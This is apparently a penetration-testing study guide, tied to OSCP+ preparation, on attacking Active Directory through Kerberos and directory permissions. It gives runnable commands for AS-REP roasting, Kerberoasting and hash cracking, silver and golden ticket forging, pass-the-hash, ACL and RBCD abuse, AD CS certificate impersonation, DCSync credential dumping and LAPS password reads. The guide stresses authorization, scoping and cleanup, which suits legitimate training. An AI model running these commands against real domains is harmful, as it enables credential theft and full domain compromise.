title: 9.6.3 Kerberos and Identity Transitions
text: id="kerberos-and-identity-transitions">9.6.3 Kerberos and Identity Transitions ← Stage index | Domain mapping | Credential access | Credential handling | AD cheatsheet | Strategy map | Study methods: Recover and use authentication material ; Map Active Directory attack paths ; Gain a more useful domain identity Purpose: convert a validated Block 10 identity/account/ SPN /ticket candidate into typed offline material or a new authenticated identity, then return to mapping. Boundary: ticket requests and local ticket handling are covered here. Matching the resulting password/hash/ticket to remote execution is Block 12 lateral movement . <h2

title: 9.6.3.1 Kerberos model and prerequisites
text: id="1-kerberos-model-and-prerequisites">9.6.3.1 Kerberos model and prerequisites AS-REQ/AS-REP: user proves knowledge of long-term key -> receives TGT TGS-REQ/TGS-REP: TGT requests SERVICE/HOST -> receives service ticket AP-REQ: client presents service ticket -> service authenticates client AUTHORIZATION: target service still evaluates the represented identity/claims Before changing credentials or tools: getent hosts DC_HOST nc -nvz DC_IP 88 date -u w32tm /query /status klist Record domain FQDN/realm, DC FQDN/IP, source DNS, current time, KDC route and exact target SPN. IP connectivity does not replace hostname/SPN correctness. <h2

title: 9.6.3.2 Password policy and bounded validation
text: id="2-password-policy-and-bounded-validation">9.6.3.2 Password policy and bounded validation net accounts /domain Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess Password validation belongs to the existing credential procedure . Do not spray by default. If explicitly required, account for lockout threshold, duration, observation window and prior failures; use one justified candidate, stop on lockout/rate-limit evidence and preserve successful identities separately. <h2

title: 9.6.3.3 AS-REP roasting
text: id="3-as-rep-roasting">9.6.3.3 AS-REP roasting <h3

title: 9.6.3.3.1 Why AS-REP roasting works
text: id="why-as-rep-roasting-works">9.6.3.3.1 Why AS-REP roasting works Ordinary Kerberos preauthentication makes the user prove knowledge of the long-term key before the KDC returns AS-REP material. If the account has DONT_REQUIRE_PREAUTH , an unauthenticated requester can ask for an AS-REP whose encrypted component can be tested offline against password candidates. KNOWN USERNAME + PREAUTH DISABLED + KDC REACHABLE -> AS-REP CIPHER -> OFFLINE GUESSING -> PASSWORD ONLY IF A CANDIDATE VERIFIES <h3

title: 9.6.3.3.2 One known user, no password
text: id="one-known-user-no-password">9.6.3.3.2 One known user, no password impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request \ -dc-ip DC_IP -outputfile asrep-TARGET_USER.hashes <h3

title: 9.6.3.3.3 Supplied user list, no password
text: id="supplied-user-list-no-password">9.6.3.3.3 Supplied user list, no password impacket-GetNPUsers 'DOMAIN/' -no-pass -request -usersfile users.txt \ -dc-ip DC_IP -outputfile asrep.hashes <h3

title: 9.6.3.3.4 Authenticated directory-backed discovery
text: id="authenticated-directory-backed-discovery">9.6.3.3.4 Authenticated directory-backed discovery impacket-GetNPUsers 'DOMAIN/USER' -request \ -dc-ip DC_IP -outputfile asrep.hashes Omitting the password from the target lets the tool prompt rather than storing it in shell history. <h3

title: 9.6.3.3.5 Windows/Rubeus alternative
text: id="windowsrubeus-alternative">9.6.3.3.5 Windows/Rubeus alternative Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:asrep.hashes /format:hashcat <h3

title: 9.6.3.3.6 Interpret before cracking
text: id="interpret-before-cracking">9.6.3.3.6 Interpret before cracking Output Meaning Next action $krb5asrep$23$ RC4 AS-REP offline verifier Hashcat mode 18200 AS-REP with another etype Different cipher/format Match the exact prefix to installed Hashcat/John support KDC_ERR_C_PRINCIPAL_UNKNOWN User/realm not found Recheck spelling, realm and DC Preauthentication required / no UF_DONT_REQUIRE_PREAUTH Account is not roastable through this method Disprove this path for that account Timeout/name error KDC route/DNS problem Fix route/FQDN/time before account conclusions hashcat -m 18200 asrep.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 18200 asrep.hashes --show Do not call the account compromised because a hash was captured. Only a verified offline candidate produces a password, and that password still needs identity/access mapping. <h2

title: 9.6.3.4 Kerberoasting
text: id="4-kerberoasting">9.6.3.4 Kerberoasting <h3

title: 9.6.3.4.1 Why Kerberoasting works
text: id="why-kerberoasting-works">9.6.3.4.1 Why Kerberoasting works Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing. VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE -> TGS-REP CIPHER -> OFFLINE GUESSING -> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket. <h3

title: 9.6.3.4.2 Enumerate without requesting tickets
text: id="enumerate-without-requesting-tickets">9.6.3.4.2 Enumerate without requesting tickets impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER' Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST <h3

title: 9.6.3.4.3 Request one selected user
text: id="request-one-selected-user">9.6.3.4.3 Request one selected user impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER' Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes <summary

title: 9.6.3.4.3.1 Request all mapped candidates
text: id="variant-9-6-3-4-3-1">9.6.3.4.3.1 Request all mapped candidates impacket-GetUserSPNs -request -dc-ip DC_IP \ -outputfile kerberoast.hashes 'DOMAIN/USER' Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification. <h3

title: 9.6.3.4.4 Hash type and cracking
text: id="hash-type-and-cracking">9.6.3.4.4 Hash type and cracking Prefix Kerberos etype Hashcat mode $krb5tgs$23$ RC4-HMAC 13100 $krb5tgs$17$ AES128 19600 $krb5tgs$18$ AES256 19700 hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m MODE HASH_FILE --show Select the mode from the actual prefix and current hashcat --example-hashes ; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition. <h3

title: 9.6.3.4.5 Common failures
text: id="common-failures">9.6.3.4.5 Common failures no SPNs returned: wrong domain/base/ authentication context, filtering or no user SPNs; KDC_ERR_S_PRINCIPAL_UNKNOWN : SPN is absent/malformed or queried in the wrong realm; KDC_ERR_ETYPE_NOSUPP : requested cipher conflicts with account/domain policy; output wraps or fails to load: save directly to an output file and verify prefix/line integrity; crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.” <h2

title: 9.6.3.5 Targeted Kerberoasting from object control
text: id="5-targeted-kerberoasting-from-object-control">9.6.3.5 Targeted Kerberoasting from object control If Block 10 proved effective write access to a user object's servicePrincipalName , an SPN can be temporarily added, requested and removed. This is a state-changing directory attack and must preserve original state. Built-in SPN operations: setspn -L TARGET_USER setspn -S temporary/TARGET_USER TARGET_USER Request only that account: impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile targeted-TARGET_USER.hashes 'DOMAIN/USER' Cleanup: setspn -D temporary/TARGET_USER TARGET_USER setspn -L TARGET_USER The controlled right must apply to the SPN attribute, -S must not collide with an existing SPN, and cleanup is part of the procedure. A recovered password is still validated and mapped as a new identity. <h2

title: 9.6.3.6 Ticket inventory, classification and conversion
text: id="6-ticket-inventory-classification-and-conversion">9.6.3.6 Ticket inventory, classification and conversion klist klist tgt klist sessions klist -li 0xLUID tickets klist -li 0xLUID tgt Rubeus.exe triage Rubeus.exe dump /luid:0xLUID /nowrap Do not run klist purge during triage. Field/pattern Interpretation Decision Client: USER @ REALM Identity represented Map that exact user/computer and realm Client ending in $ Computer identity Establish machine-account rights; do not treat as a human user Server: krbtgt/REALM TGT Can request service tickets while valid, within that client's authorization Server: cifs/HOST CIFS service ticket Only SMB/CIFS on the named host; authorization still applies Server: ldap/DC_HOST LDAP service ticket LDAP authentication, not replication rights Other SERVICE/HOST Ticket for that SPN Use matching hostname/service/client Start/End/Renew Time Validity windows Import cannot revive an expired/not-yet-valid ticket Ticket flags Kerberos behavior/history Not evidence of privilege Kdc Called Issuing KDC Not evidence of access to that DC Encryption/session key Compatibility/policy clue Not privilege or password strength Linux cache: klist -c ticket.ccache export KRB5CCNAME="$PWD/ticket.ccache" Convert only when a client expects the other container: impacket-ticketConverter ticket.kirbi ticket.ccache impacket-ticketConverter ticket.ccache ticket.kirbi <h2

title: 9.6.3.7 Pass-the-Ticket and key-to-ticket transitions
text: id="7-pass-the-ticket-and-key-to-ticket-transitions">9.6.3.7 Pass-the-Ticket and key-to-ticket transitions These commands establish a local ticket context. Block 12 selects and validates the remote service. Windows/Rubeus: Rubeus.exe ptt /ticket:ticket.kirbi klist Windows/Mimikatz: kerberos::ptt ticket.kirbi kerberos::list Linux: export KRB5CCNAME="$PWD/ticket.ccache" klist NT hash or AES key to a TGT: Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist Use /aes128: or /aes256: when that is the actual key type and tool version supports it. RC4-based requests can fail where RC4 is disabled even though the NT hash is correct. Mimikatz creates a new process using supplied key material: sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:cmd.exe This is a credential/ticket-context transition, not proof that a destination accepts the identity. <h2

title: 9.6.3.8 Silver tickets: forge one service ticket
text: id="8-silver-tickets-forge-one-service-ticket">9.6.3.8 Silver tickets: forge one service ticket Prerequisite: key/hash of the account encrypting the target SPN's tickets, domain SID , exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior. Linux/Impacket: impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID \ -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" klist Windows/Mimikatz: kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /target:TARGET_HOST /service:cifs /rc4:SERVICE_NT_HASH /user:AUTHORIZED_TEST_USER /ptt Despite the Mimikatz module name, supplying a service/target key produces a silver/service ticket, not a krbtgt-signed TGT. Important boundaries: the key must belong to the account that owns the SPN; machine-account keys commonly protect host services; the ticket is limited to the named service/host and whichever services share the same account key; current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior; a service may perform KDC/PAC validation or additional authorization; a successfully imported ticket is not successful service access. Golden tickets require the KRBTGT key and domain SID and create a forged TGT. They are a high-impact persistence concept covered in the conditional domain-compromise section , not a default Block 11 action. <h2

title: 9.6.3.9 Re-enumerate every new identity
text: id="9-re-enumerate-every-new-identity">9.6.3.9 Re-enumerate every new identity NEW PASSWORD/HASH/KEY/TICKET -> VERIFY TYPE, CLIENT, REALM, VALIDITY -> AUTHENTICATE THROUGH ONE COMPATIBLE SERVICE -> CONFIRM IDENTITY -> REPEAT GROUP/ACL/SHARE/HOST/SESSION/ROUTE MAPPING Do not overwrite the old state. Record which source produced the material and which protocol accepted it. <h2

title: 9.6.3.10 Failure router
text: id="10-failure-router">9.6.3.10 Failure router Symptom Layer Next test KDC unreachable Route/service DNS/FQDN, TCP/UDP 88, pivot path Clock-skew error Time Synchronize source to authorized domain time Principal unknown Identity/realm Exact username, realm and DC Preauth required AS-REP prerequisite absent Disprove AS-REP roast for that account No SPNs Enumeration/context Correct domain, bind identity, filter and account type Etype unsupported Cipher policy Use supported account/domain/tool path; do not blame password Hashcat loads zero hashes Format/mode/file integrity Inspect prefix, wrapping and mode examples Exhausted wordlist Candidate model failed Improve candidates or deprioritize; no credential was recovered Ticket import succeeds, access fails SPN/service/authorization/route Client, validity, hostname, service class and target rights Silver ticket rejected Wrong key/SPN/domain SID/PAC behavior Revalidate every prerequisite; use a real authorized identity NT hash to TGT fails RC4 disabled or identity/key mismatch Exact key type, realm, user and KDC policy <h2

title: 9.6.3.11 Tooling for this section
text: id="tooling-for-this-section">9.6.3.11 Tooling for this section Tool Choose it when Requirements Baseline Decisive output Failure cue Impacket GetNPUsers AS-REP candidate from Kali Username/list, KDC route; no password for direct candidate test Section 3 $krb5asrep$ line Preauth required/principal unknown Impacket GetUserSPNs Enumerate/request selected SPN account Valid domain identity, LDAP/KDC route -request-user TARGET_USER $krb5tgs$ line No SPN/etype/KDC error Rubeus Windows roasting and ticket lifecycle Domain Windows context or alternate credential; compatible build kerberoast /stats , selected roast, triage Account/hash/ticket metadata LDAP/KDC/privilege/version failure Hashcat/John Offline verifier testing Exact format/mode and candidates Modes 18200/13100/19600/19700 as applicable Verified recovered candidate Zero hashes loaded/exhausted candidates klist Native ticket metadata Windows or Kerberos client klist / klist -c Client, server, validity, etype Wrong cache/ LUID or expired ticket Impacket ticketConverter Tool requires ccache vs kirbi Valid ticket file and compatible release ticketConverter INPUT OUTPUT Parsed output container Invalid/truncated ticket Impacket ticketer/Mimikatz Validated silver-ticket prerequisite Service/machine key, SID, SPN and isolated authorization Section 8 Ticket with expected client/server fields Wrong key/SPN/PAC/authorization <h2

title: 9.6.3.12 Timeroast — offline recovery of weak computer-account passwords via MS-SNTP
text: id="timeroast--offline-recovery-of-weak-computer-account-passwords-via-ms-sntp">9.6.3.12 Timeroast — offline recovery of weak computer-account passwords via MS-SNTP Use when the DC exposes UDP/123 and Windows authenticated NTP responses are available for computer/trust-account RIDs. This is separate from Kerberos roasting and does not require a domain password. Prefer a known computer RID; the example range is bounded discovery, not a completeness guarantee. python3 timeroast.py DC_IP --rids 1000-1100 --rate 10 --timeout 5 -o timeroast.txt hashcat -m 31300 --username timeroast.txt WORDLIST hashcat -m 31300 --username timeroast.txt --show Read: output resembles RID:$sntp-ms$... and is a response-derived offline verifier, not a reusable NT hash. Map any recovered RID to the exact computer/trust identity before testing its password on one relevant service. Normally rotated random machine passwords are not practical dictionary candidates. No reply can mean filtering, unsupported behavior, nonexistent RIDs or packet loss. Do not infer no AD accounts or switch blindly to an unbounded RID sweep. The source's NetExec module is an alternative wrapper; inspect its installed options because its default RID sweep is very broad. Sources: upstream 1 · upstream 2 . <h2

title: 9.6.3.13 Sources
text: id="sources">9.6.3.13 Sources Supplied PEN-200, Chapter 23, pp758–785, and Chapter 24 ticket handling where referenced. OffSec OSCP+ Body of Knowledge OffSec OSCP+ Exam FAQ Impacket GetNPUsers , GetUserSPNs , ticketConverter and ticketer Rubeus Microsoft klist Hashcat example hashes getSH Active Directory route , source snapshot e1f62dd Hexdump consolidated cheatsheet . Its AS-REP/Kerberoast seeds were checked against current Impacket, Rubeus and Hashcat sources; the live Hexdump AD module itself was still a TODO.

title: 9.6.4 Object Control, AD CS and Domain Compromise
text: id="object-control-ad-cs-and-domain-compromise">9.6.4 Object Control, AD CS and Domain Compromise ← Stage index | Domain mapping | AD cheatsheet | Strategy map | Study methods: Map Active Directory attack paths ; Gain a more useful domain identity Active Block 11 core: user, group, SPN and DACL -backed identity transitions, plus the rights required for DCSync. Conditional supplements: GPO abuse, delegation/RBCD and AD CS remain evidence-led branches rather than core Block 11 study. <h2

title: 9.6.4.1 Directory-object control
text: id="directory-object-control">9.6.4.1 Directory-object control Model: controlled principal → effective ACE → target object/type → permitted modification → authentication / authorization effect → cleanup. Enumerate a target's ACL with resolved GUIDs: Import-Module .\PowerView.ps1 Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' } Resolve trustees: ConvertFrom-SID 'S-1-5-21-...' Get-DomainObject -Identity 'S-1-5-21-...' | Select-Object samaccountname,objectclass Common effects require different rights: Right/object Possible controlled effect Validation needed GenericAll /password-reset extended right on user Reset the user's password Effective trustee, account state, protected-object behavior GenericAll or effective member-attribute write on group Add a controlled principal to the group Target group, nesting and a refreshed logon token GenericWrite /SPN-property write on user Add a temporary SPN, request a TGS and remove it Exact property right, duplicate-SPN checks and cleanup WriteDacl Grant a narrower right Ability to write DACL and restore original ACL WriteOwner Change owner, then possibly DACL Owner semantics and cleanup Computer-object write RBCD-related attribute change Machine account/control, SPN/Kerberos and target service <h3

title: 9.6.4.1.1 Password reset
text: id="password-reset">9.6.4.1.1 Password reset A password-reset right creates a new password credential; it does not reveal the old one. This is disruptive because an unknown original password cannot be restored. $Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose net user TARGET_USER TEMP_PASSWORD /domain Validate the account state and authenticate only to an approved service as the target identity. Prefer a reversible route when one exists. <h3

title: 9.6.4.1.2 Group membership
text: id="group-membership">9.6.4.1.2 Group membership <h4

title: 9.6.4.1.2.1 Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose
text: id="variant-9-6-4-1-2-1">9.6.4.1.2.1 Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose Get-DomainGroupMember -Identity TARGET_GROUP | Where-Object { $_.MemberName -eq 'CONTROLLED_USER' } <h4

title: 9.6.4.1.2.2 Built-in alternative
text: id="variant-9-6-4-1-2-2">9.6.4.1.2.2 Built-in alternative # Built-in alternative net group TARGET_GROUP CONTROLLED_USER /add /domain A current session may not receive the new group SID until a fresh logon. Validate with a new session/token, then remove the membership after the authorized objective: Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false net group TARGET_GROUP CONTROLLED_USER /delete /domain <h3

title: 9.6.4.1.3 Targeted Kerberoast through SPN write
text: id="targeted-kerberoast-through-spn-write">9.6.4.1.3 Targeted Kerberoast through SPN write If the effective right permits writing servicePrincipalName on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in Kerberos and identity transitions . setspn -S TEMP/TARGET_USER TARGET_USER setspn -Q TEMP/TARGET_USER Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat setspn -D TEMP/TARGET_USER TARGET_USER <h3

title: 9.6.4.1.4 Owner and DACL transitions
text: id="owner-and-dacl-transitions">9.6.4.1.4 Owner and DACL transitions WriteOwner can make the controlled identity the owner; ownership may then permit a DACL change. WriteDacl can grant only the narrower right needed for the intended transition. <h4

title: 9.6.4.1.4.1 Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose
text: id="variant-9-6-4-1-4-1">9.6.4.1.4.1 Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose <h4

title: 9.6.4.1.4.2 Group-membership variant
text: id="variant-9-6-4-1-4-2">9.6.4.1.4.2 Group-membership variant # Group-membership variant Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_USER -Rights WriteMembers -Verbose <h4

title: 9.6.4.1.4.3 Remove the ACE after the authorized objective
text: id="variant-9-6-4-1-4-3">9.6.4.1.4.3 Remove the ACE after the authorized objective # Remove the ACE after the authorized objective Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge. <h2

title: 9.6.4.2 Conditional: GPO control
text: id="conditional-gpo-control">9.6.4.2 Conditional: GPO control Identify GPOs and links: Get-DomainGPO Get-DomainOU | Select-Object name,distinguishedname,gplink Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' } For a candidate, prove: the controlled principal can edit both the directory object and relevant SYSVOL policy files; the GPO is linked to the OU containing the intended test host/user; security filtering and WMI filters include that subject; the configured preference/task/script runs in the expected context; and policy refresh or another predictable trigger will occur. SharpGPOAbuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. Inspect the installed build before a controlled lab action: SharpGPOAbuse.exe --help gpresult /r gpupdate /force Back up the GPO, restrict the target/scope, document the exact change and restore it after validation. <h2

title: 9.6.4.3 Conditional: delegation paths
text: id="conditional-delegation-paths">9.6.4.3 Conditional: delegation paths Enumerate before attempting any ticket operation: Get-DomainComputer -Unconstrained | Select-Object dnshostname Get-DomainUser -TrustedToAuth | Select-Object samaccountname Get-DomainComputer -TrustedToAuth | Select-Object dnshostname Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN: impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \ -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD' export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material. <h3

title: 9.6.4.3.1 Resource-based constrained delegation
text: id="resource-based-constrained-delegation">9.6.4.3.1 Resource-based constrained delegation Prerequisite: effective write control over the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity plus control of a principal with an SPN (often a lab computer account). impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \ -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \ -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD' impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \ -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD' Cleanup after the lab objective: impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \ -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD' impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \ -delete -dc-ip DC_IP Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites. <h2

title: 9.6.4.4 Conditional: AD CS enumeration
text: id="conditional-ad-cs-enumeration">9.6.4.4 Conditional: AD CS enumeration Prerequisite: reachable CA/DC and a valid domain identity. Decisive output: a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path. Package names vary: command -v certipy-ad || command -v certipy certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -enabled -vulnerable -stdout Review: CA name and host; template name and whether it is enabled/published; who can enroll; client-authentication EKUs/purpose; subject/SAN supply controls; manager approval/signature requirements; template owner and modification rights; web enrollment/relay-related configuration where relevant. An ESC label is a candidate classification. Manually validate the properties and the controlled identity's effective rights. <h2

title: 9.6.4.5 Conditional: certificate request and authentication
text: id="conditional-certificate-request-and-authentication">9.6.4.5 Conditional: certificate request and authentication Generic request after validating a specific template: certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -target DC_HOST -ca CA_NAME -template TEMPLATE An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing: certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -target DC_HOST -ca CA_NAME -template TEMPLATE \ -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID' certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication. <h2

title: 9.6.4.6 Conditional: ESC4/template-write boundary
text: id="conditional-esc4template-write-boundary">9.6.4.6 Conditional: ESC4/template-write boundary Before any authorized template change, save configuration: certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -template TEMPLATE -save-configuration template-backup.json Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect certipy-ad template -h for the installed version, and restore the saved configuration after the demonstration. <h2

title: 9.6.4.7 DCSync replication rights
text: id="dcsync-replication-rights">9.6.4.7 DCSync replication rights Prerequisite: effective domain-root rights equivalent to Replicating Directory Changes plus Replicating Directory Changes All (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient. Validate ACLs at the domain root: Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' } A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path: <h3

title: 9.6.4.7.1 Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
text: id="variant-9-6-4-7-1">9.6.4.7.1 Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose <h3

title: 9.6.4.7.2 Remove the delegated replication ACE after the authorized objective
text: id="variant-9-6-4-7-2">9.6.4.7.2 Remove the delegated replication ACE after the authorized objective # Remove the delegated replication ACE after the authorized objective Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change. Request one approved test account rather than dumping the directory: impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \ 'DOMAIN/USER:PASSWORD@DC_HOST' Mimikatz equivalent from an authorized Windows context: lsadump::dcsync /domain:DOMAIN /user:TARGET_USER Decisive output: selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection. <h2

title: 9.6.4.8 Conditional: high-impact ticket-forging concepts
text: id="conditional-high-impact-ticket-forging-concepts">9.6.4.8 Conditional: high-impact ticket-forging concepts Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use Silver tickets . Authorized isolated-lab examples: # Golden: realm-wide TGT material impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid DOMAIN_SID \ -domain DOMAIN AUTHORIZED_TEST_USER export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" klist Use only against the approved service/host, record ticket metadata and remove generated credentials afterward. Domain recovery after KRBTGT exposure generally requires coordinated credential rotation and replication convergence; service-ticket exposure requires rotating the affected service/machine secret and reviewing access. <h2

title: 9.6.4.9 bloodyAD — Linux-side LDAP reads and permission-backed writes
text: id="bloodyad--linux-side-ldap-reads-and-permission-backed-writes">9.6.4.9 bloodyAD — Linux-side LDAP reads and permission-backed writes Use an authenticated LDAP context and the exact right on the target object. Start with a read. These writes are distinct alternatives selected by the observed ACL: <h3

title: 9.6.4.9.1 Inspect the target/group instead of assuming the relationship
text: id="variant-9-6-4-9-1">9.6.4.9.1 Inspect the target/group instead of assuming the relationship # Inspect the target/group instead of assuming the relationship bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ get object TARGET_OBJECT --attr distinguishedName,member,memberOf <h3

title: 9.6.4.9.2 Force-change-password right on this specific account
text: id="variant-9-6-4-9-2">9.6.4.9.2 Force-change-password right on this specific account # Force-change-password right on this specific account bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ set password TARGET_USER 'NEW_PASSWORD' <h3

title: 9.6.4.9.3 Write-members right on this specific group
text: id="variant-9-6-4-9-3">9.6.4.9.3 Write-members right on this specific group # Write-members right on this specific group bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ add groupMember TARGET_GROUP USER Read: verify the actual attribute change and test the resulting identity/capability through a compatible service. Group changes do not automatically refresh an existing process token/ticket. Access denied → inspect the object DACL and protected-account context; authentication alone is insufficient. Account Operators membership does not imply control over protected administrator accounts/groups. Sources: upstream 1 . <h2

title: 9.6.4.10 Delegated reads — LAPS and gMSA material
text: id="delegated-reads--laps-and-gmsa-material">9.6.4.10 Delegated reads — LAPS and gMSA material Use when directory permissions grant access to the secret-bearing attribute. Being able to enumerate the computer or service account does not grant that read. <h3

title: 9.6.4.10.1 Classic LAPS: password for the relevant computer's local administrator
text: id="variant-9-6-4-10-1">9.6.4.10.1 Classic LAPS: password for the relevant computer's local administrator # Classic LAPS: password for the relevant computer's local administrator bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ get object 'COMPUTER$' --attr ms-Mcs-AdmPwd <h3

title: 9.6.4.10.2 Windows LAPS: returned content/format depends on schema and protection
text: id="variant-9-6-4-10-2">9.6.4.10.2 Windows LAPS: returned content/format depends on schema and protection # Windows LAPS: returned content/format depends on schema and protection bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \ get object 'COMPUTER$' --attr msLAPS-Password <h3
